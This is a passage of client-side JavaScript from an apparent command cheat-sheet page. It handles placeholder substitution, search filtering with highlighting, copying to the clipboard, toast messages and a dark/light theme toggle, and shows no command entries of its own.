        }
    });
    
    // Highlight remaining placeholders
    result = result.replace(/&lt;([A-Z0-9_]+)&gt;/g, '<span class="ph">&lt;$1&gt;</span>');
    
    return result;
}

function getRawCommand(cmd) {
    let result = cmd;
    Object.keys(globalVars).forEach(ph => {
        const val = getGlobalValue(ph);
        if(val) {
            result = result.replace(new RegExp(ph.replace(/[<>]/g, '\\$&'), 'g'), val);
        }
    });
    return result;
}

function getGlobalValue(ph) {
    const inputId = globalVars[ph];
    if(inputId) {
        const el = document.getElementById(inputId);
        return el ? el.value : '';
    }
    return '';
}

function escapeHtml(t) {
    const d = document.createElement('div');
    d.textContent = t;
    return d.innerHTML;
}

let currentSearchTerms = [];
function hlText(text) {
    if (!text) return '';
    if (!currentSearchTerms.length) return escapeHtml(text);
    let h = escapeHtml(text);
    currentSearchTerms.forEach(term => {
        h = h.replace(new RegExp('(' + term.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', 'gi'), '<mark>$1</mark>');
    });
    return h;
}

// ============================================
// REFRESH AND FILTER
// ============================================
function refreshAll() {
    // Re-render all visible command codes
    commands.forEach(c => {
        const codeEl = document.getElementById('cmd-code-' + c.id);
        if(codeEl) {
            codeEl.innerHTML = processCommand(c.cmd);
        }
    });
    showToast('Commands updated!');
}

function clearGlobals() {
    Object.values(globalVars).forEach(id => {
        document.getElementById(id).value = '';
    });
    refreshAll();
    showToast('Cleared all values');
}

function filterCommands() {
    const query = document.getElementById('search').value.toLowerCase().trim();

    if(!query) {
        currentSearchTerms = [];
        showAllCommands();
        return;
    }

    const terms = query.split(/\s+/).filter(t => t.length > 0);
    currentSearchTerms = terms;
    const filtered = commands.filter(c => {
        const text = [c.n, c.purp, c.cmd, c.cat, c.sub, c.proto, c.tips || ''].join(' ').toLowerCase();
        return terms.every(t => text.includes(t));
    });
    
    const content = document.getElementById('content');
    
    if(filtered.length === 0) {
        content.innerHTML = `<div class="empty"><div class="icon">🔍</div><h3>No commands found</h3><p>Try different search terms</p></div>`;
        updateShowingCount(0);
        return;
    }
    
    let html = `
        <div class="section-header">
            <h2>🔍 Search Results</h2>
            <p>Found ${filtered.length} commands matching "${query}"</p>
        </div>
        ${filtered.map(c => renderCommandCard(c)).join('')}
    `;
    
    content.innerHTML = html;
    updateShowingCount(filtered.length);
}

function updateNavActive() {
    document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
}

function updateShowingCount(count) {
    document.getElementById('showing-cmds').textContent = count !== undefined ? count : commands.length;
}

// ============================================
// COPY
// ============================================
function copyCmd(id, event) {
    event.stopPropagation();
    
    const cmd = commands.find(c => c.id === id);
    if(!cmd) return;
    
    const rawCmd = getRawCommand(cmd.cmd);
    
    navigator.clipboard.writeText(rawCmd).then(() => {
        const btn = event.target;
        btn.classList.add('copied');
        btn.textContent = '✓ Copied!';
        showToast('Command copied!');
        
        setTimeout(() => {
            btn.classList.remove('copied');
            btn.textContent = 'Copy';
        }, 2000);
    }).catch(() => {
        // Fallback
        const ta = document.createElement('textarea');
        ta.value = rawCmd;
        ta.style.position = 'fixed';
        ta.style.left = '-9999px';
        document.body.appendChild(ta);
        ta.select();
        try {
            document.execCommand('copy');
            showToast('Command copied!');
        } catch(e) {
            showToast('Copy failed');
        }
        document.body.removeChild(ta);
    });
}

function showToast(msg) {
    const t = document.getElementById('toast');
    t.textContent = msg;
    t.classList.add('show');
    setTimeout(() => t.classList.remove('show'), 2000);
}

    setTheme(current === 'dark' ? 'light' : 'dark');
  }
  document.addEventListener('keydown', function(e) {
    if (e.key === 't' || e.key === 'T') toggleTheme();
  });
  var btn = document.getElementById('theme-toggle-btn');
  if (btn) btn.addEventListener('click', toggleTheme);
  var saved = 'dark';
  try { saved = localStorage.getItem('mahdiesta-theme') || 'dark'; } catch(e) {}
  setTheme(saved);
})();
